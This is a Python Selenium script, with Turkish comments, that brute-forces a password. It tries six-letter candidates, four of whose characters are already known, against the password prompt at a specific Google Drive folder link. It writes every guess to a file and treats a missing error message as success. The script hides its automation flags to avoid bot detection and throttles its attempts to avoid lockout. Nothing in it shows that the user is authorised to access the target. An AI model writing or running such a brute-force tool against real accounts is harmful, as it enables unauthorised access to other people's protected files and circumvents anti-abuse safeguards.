from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

# Olası harfler (senin liste)
possible_letters = ['A', 'B', 'D', 'E', 'F', 'G', 'H', 'I', 'L', 'Y', 'K', 'L', 'M', 'N', 'O', 'P', 'R', 'S', 'T', 'U', 'V', 'W', 'Z', 'TH', 'El', 'NG']
known_letters = {2: 'F', 4: 'H', 5: 'F', 6: 'R'}

# Google Drive linki (burayı değiştireceksin)
GOOGLE_DRIVE_LINK = "https://drive.google.com/drive/folders/1tQpR5Uz4-60hMeUrN7ekaY27P7-Ct9FT"  # Örnek: https://drive.google.com/file/d/abc123xyz

# Chrome ayarları (bot algısını azaltmak için)
options = webdriver.ChromeOptions()
options.add_argument("--start-maximized")
options.add_argument("--disable-blink-features=AutomationControlled")  # Bot algısını azalt
options.add_experimental_option("excludeSwitches", ["enable-automation"])

# Chrome’u başlat
try:
    driver = webdriver.Chrome(options=options)
    print("Tarayıcı açıldı.")
except Exception as e:
    print(f"ChromeDriver hatası: {e}")
    print("ChromeDriver’ı kontrol et veya https://chromedriver.chromium.org/downloads’dan indir!")
    exit()

# Google Drive linkine git
try:
    driver.get(GOOGLE_DRIVE_LINK)
    print("Google Drive linkine gidildi.")
    time.sleep(5)  # Şifre ekranının yüklenmesi için bekle
except Exception as e:
    print(f"Linke gidilemedi: {e}")
    driver.quit()
    exit()

# Şifreleri dene
with open('sifreler.txt', 'w') as f:
    f.write("Denenen şifreler:\n")
    for first in possible_letters:
        for third in possible_letters:
            password = [''] * 6
            password[0] = first
            password[1] = known_letters[2]
            password[2] = third
            password[3] = known_letters[4]
            password[4] = known_letters[5]
            password[5] = known_letters[6]
            sifre = ''.join(password)
            f.write(sifre + '\n')

            print(f"Deneniyor: {sifre}")
            try:
                # Şifre giriş alanını bul (farklı yöntemlerle)
                password_field = None
                for method in [
                    (By.NAME, "password"),
                    (By.XPATH, "//input[@type='password']"),
                    (By.CSS_SELECTOR, "input[type='password']"),
                    (By.XPATH, "//input[@placeholder='Enter password']"),
                    (By.CLASS_NAME, "password")
                ]:
                    try:
                        password_field = WebDriverWait(driver, 10).until(
                            EC.presence_of_element_located(method)
                        )
                        print("Şifre alanı bulundu!")
                        break
                    except:
                        continue

                if not password_field:
                    print("Şifre giriş alanı bulunamadı! Linki veya sayfayı kontrol et.")
                    driver.quit()
                    exit()

                # Şifreyi gir
                password_field.clear()
                password_field.send_keys(sifre)
                
                # Gönder butonunu bul ve tıkla (Enter yerine)
                try:
                    submit_button = WebDriverWait(driver, 5).until(
                        EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Submit') or contains(text(), 'Gönder') or contains(text(), 'Unlock')]"))
                    )
                    submit_button.click()
                    print("Gönder butonuna tıklandı.")
                except:
                    # Buton yoksa Enter dene
                    password_field.send_keys(Keys.RETURN)
                    print("Enter tuşu kullanıldı.")
                
                time.sleep(3)  # Sayfanın yanıt vermesi için bekle

                # Sonucu kontrol et
                try:
                    # Hata mesajı var mı?
                    error_elements = [
                        (By.XPATH, "//*[contains(text(), 'Invalid') or contains(text(), 'Yanlış') or contains(text(), 'incorrect') or contains(text(), 'try again')]"),
                        (By.CLASS_NAME, "error-message"),
                        (By.CLASS_NAME, "aCsJod")  # Google Drive’ın hata sınıfı
                    ]
                    error_found = False
                    for error_method in error_elements:
                        try:
                            error_message = driver.find_element(*error_method)
                            print(f"Şifre yanlış: {sifre}")
                            error_found = True
                            break
                        except:
                            continue

                    if not error_found:
                        # Hata mesajı yoksa, şifre doğru olabilir
                        print(f"DOĞRU ŞİFRE BULUNDU: {sifre}")
                        with open('dogru_sifre.txt', 'w') as df:
                            df.write(f"Doğru şifre: {sifre}\n")
                        driver.quit()
                        exit()

                except:
                    # Hata mesajı kontrolü başarısızsa, şifre doğru olabilir
                    print(f"DOĞRU ŞİFRE BULUNDU: {sifre}")
                    with open('dogru_sifre.txt', 'w') as df:
                        df.write(f"Doğru şifre: {sifre}\n")
                    driver.quit()
                    exit()

                time.sleep(2)  # Google’ın kilitlememesi için bekle

            except Exception as e:
                print(f"Hata oluştu: {e}")
                print("CAPTCHA, kilit veya başka bir sorun çıktı. Sayfayı elle kontrol et!")
                driver.quit()
                exit()

# Bitti
driver.quit()
print("Tüm şifreler denendi, doğru şifre bulunamadı. 'sifreler.txt'yi kontrol et.")